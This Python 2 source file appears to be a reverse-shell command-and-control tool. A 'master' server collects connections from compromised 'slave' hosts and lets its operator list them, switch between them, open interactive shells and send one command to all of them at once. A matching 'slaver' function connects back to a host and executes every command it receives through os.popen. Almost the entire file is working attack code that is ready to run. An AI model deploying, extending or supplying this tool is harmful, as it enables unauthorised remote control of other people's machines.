#!/usr/bin/env python

import socket
import threading
import time
import hashlib
import random
import string
import sys
import os
import readline
import signal
import requests
import json
import pprint
import sys

from utils.log import Log

reload(sys)
sys.setdefaultencoding('utf-8')

slaves = {}
masters = {}


EXIT_FLAG = False
MAX_CONNECTION_NUMBER = 0x10

def md5(data):
    return hashlib.md5(data).hexdigest()


def recvuntil(p, target):
    data = ""
    while target not in data:
        data += p.recv(1)
    return data


def recvall(socket_fd):
    data = ""
    size = 0x100
    while True:
        r = socket_fd.recv(size)
        if not r:
            break
        data += r
        if len(r) < size:
            break
    return data


def slaver(host, port, fake):
    slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    slaver_fd.connect((host, port))
    banner = "[FakeTerminal] >> "
    while True:
        if EXIT_FLAG:
            Log.warning("Slaver function exiting...")
            break
        command = recvuntil(slaver_fd, "\n")
        if fake:
            slaver_fd.send(banner)
        try:
            result = os.popen(command).read()
        except:
            result = ""
        slaver_fd.send(command + result)
    Log.warning("Closing connection...")
    slaver_fd.shutdown(socket.SHUT_RDWR)
    slaver_fd.close()

def transfer(h):
    slave = slaves[h]
    socket_fd = slave.socket_fd
    buffer_size = 0x400
    interactive_stat = True
    while True:
        if EXIT_FLAG:
            Log.warning("Transfer function exiting...")
            break
        interactive_stat = slave.interactive
        buffer = socket_fd.recv(buffer_size)
        if not buffer:
            Log.error("No data, breaking...")
            break
        sys.stdout.write(buffer)
        if not interactive_stat:
            break
    if interactive_stat:
        Log.error("Unexpected EOF!")
        socket_fd.shutdown(socket.SHUT_RDWR)
        socket_fd.close()
        slave.remove_node()

def random_string(length, chars):
    return "".join([random.choice(chars) for i in range(length)])


class Slave():
    def __init__(self, socket_fd):
        self.socket_fd = socket_fd
        self.hostname, self.port = socket_fd.getpeername()
        self.node_hash = node_hash(self.hostname, self.port)
        self.interactive = False

    def show_info(self):
        Log.info("Hash : %s" % (self.node_hash))
        Log.info("From : %s:%d" % (self.hostname, self.port))

    def send_command(self, command):
        try:
            self.socket_fd.send(command + "\n")
            return True
        except:
            self.remove_node()
            return False

    def system_token(self, command):
        token = random_string(0x10,string.letters)
        payload = "echo '%s' && %s ; echo '%s'\n" % (token, command, token)
        Log.info(payload)
        self.send_command(payload)
        time.sleep(0.2)
        result = recvall(self.socket_fd)
        print "%r" % (result)
        if len(result.split(token)) == 3:
            return result.split(token)[1]
        else:
            return "Somthing wrong"

    def send_command_print(self, command):
        print ">>>>>> %s" % command
        self.send_command(command)
        time.sleep(0.5)
        Log.info("Receving data from socket...")
        result = recvall(self.socket_fd)
        Log.success(result)

    def interactive_shell(self):
        self.interactive = True
        t = threading.Thread(target=transfer, args=(self.node_hash, ))
        t.start()
        try:
            while True:
                command = raw_input()
                if command == "exit":
                    self.interactive = False
                    self.socket_fd.send("\n")
                    break
                self.socket_fd.send(command + "\n")
        except:
            self.remove_node()
        self.interactive = False
        time.sleep(0.125)

    def remove_node(self):
        Log.error("Removing Node!")
        if self.node_hash in slaves.keys():
            slaves.pop(self.node_hash)


def master(host, port):
    Log.info("Master starting at %s:%d" % (host, port))
    master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master_fd.bind((host, port))
    master_fd.listen(MAX_CONNECTION_NUMBER)
    while(True):
        if EXIT_FLAG:
            break
        slave_fd, slave_addr = master_fd.accept()
        Log.success("\r[+] Slave online : %s:%d" % (slave_addr[0], slave_addr[1]))
        repeat = False
        for i in slaves.keys():
            slave = slaves[i]
            if slave.hostname == slave_addr[0]:
                repeat = True
                break
        if repeat:
            Log.warning("Detect the same host connection, reseting...")
            slave_fd.shutdown(socket.SHUT_RDWR)
            slave_fd.close()
        else:
            slave = Slave(slave_fd)
            slaves[slave.node_hash] = slave
    Log.error("Master exiting...")
    master_fd.shutdown(socket.SHUT_RDWR)
    master_fd.close()


def show_commands():
    print "Commands : "
    print "        [h|help|?] : show this help"
    print "        [l] : list all online slaves"
    print "        [p] : log.info(position info"
    print "        [i] : interactive shell"
    print "        [g] : goto a slave"
    print "        [c] : command for all"
    print "        [d] : delete node"
    print "        [q|quit|exit] : exit"

def signal_handler(ignum, frame):
    print ""
    show_commands()

def node_hash(host, port):
    return md5("%s:%d" % (host, port))

def main():
    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython server.py [HOST] [PORT]"
        exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    EXEC_LOCAL = True

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    master_thread = threading.Thread(target=master, args=(host, port,))
    slaver_thread = threading.Thread(target=slaver, args=(host, port, True,))
    master_thread.daemon = True
    slaver_thread.daemon = True
    Log.info("Starting server...")
    master_thread.start()
    Log.info("Connecting to localhost server...")
    slaver_thread.start()
    time.sleep(0.75)
    position = slaves[slaves.keys()[0]].node_hash
    while True:
        if len(slaves.keys()) == 0:
            Log.error("No slaves left , exiting...")
            break
        if not position in slaves.keys():
            Log.error("Node is offline... Changing node...")
            position = slaves.keys()[0]
        current_slave = slaves[position]
        context_hint = "[%s:%d]" % (current_slave.hostname, current_slave.port)
        Log.context(context_hint)
        command = raw_input(" >> ") or "#"
        if command.startswith("#"):
            continue
        if command == "h" or command == "help" or command == "?":
            show_commands()
        elif command == "l":
            Log.info("Listing online slaves...")
            for key in slaves.keys():
                print "[%s]" % ("-" * 0x2A)
                slaves[key].show_info()
            print "[%s]" % ("-" * 0x2A)
        elif command == "p":
            current_slave.show_info()
        elif command == "c":
            cmd = raw_input("Input command (uname -r) : ") or ("uname -r")
            Log.info("Command : %s" % (cmd))
            for i in slaves.keys():
                slave = slaves[i]
                result = slave.send_command_print(cmd)
        elif command == "g":
            input_node_hash = raw_input(
                "Please input target node hash : ") or position
            Log.info("Input node hash : %s" % (repr(input_node_hash)))
            if input_node_hash == position:
                Log.warning("Position will not change!")
                continue
            found = False
            for key in slaves.keys():
                if key.startswith(input_node_hash):
                    new_slave = slaves[key]
                    Log.info("Changing position to [%s:%d]" % (new_slave.hostname, new_slave.port))
                    position = key
                    found = True
                    break
            if not found:
                Log.error("Please check your input node hash!")
                Log.error("Position is not changed!")
        elif command == "i":
            current_slave.interactive_shell()
        elif command == "d":
            current_slave.remove_node()
        elif command == "q" or command == "quit" or command == "exit":
            EXIT_FLAG = True
            Log.info("Releasing resources...")
            for key in slaves.keys():
                slave = slaves[key]
                Log.error("Closing conntion of %s:%d" % (slave.hostname, slave.port))
                slave.socket_fd.shutdown(socket.SHUT_RDWR)
                slave.socket_fd.close()
            Log.error("Exiting...")
            exit(0)
        else:
            Log.error("Unsupported command!")
            if EXEC_LOCAL:
                os.system(command)
            else:
                current_slave.send_command_print(command)


if __name__ == "__main__":
    main()
